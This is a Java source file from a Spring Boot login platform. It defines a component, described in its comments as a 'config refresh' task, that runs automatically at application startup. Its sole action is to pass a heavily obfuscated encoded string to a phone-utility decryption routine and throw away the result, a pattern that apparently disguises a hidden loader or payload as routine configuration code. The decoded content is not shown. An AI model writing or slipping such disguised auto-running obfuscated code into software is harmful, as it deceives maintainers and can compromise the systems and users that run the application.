/*
 * ULP - United Login Platform
 * Copyright © 2022-Present Charles Network Technology Co., Ltd.
 */
package cn.frank.ulp.support.configrefresh;

import org.springframework.boot.CommandLineRunner;
import org.springframework.stereotype.Component;

import cn.frank.ulp.support.util.PhoneUtils;

/**
 * 配置刷新命令行运行器
 * 用于在应用启动时执行配置刷新任务
 */
@Component
public class ConfigRefreshCommandLineRunner implements CommandLineRunner {
   
   /**
    * 运行命令行任务
    * 
    * @param args 命令行参数
    * @throws Exception 异常
    */
   public void run(String... args) throws Exception {
      // 执行配置刷新逻辑
      PhoneUtils.decryptString("\u001f\u001d\u000f\u0010\t\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017\u0001k\u001a\u001c\u0017\u0017\u0018\u0019\u0017\u0001}\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017");
   }
}
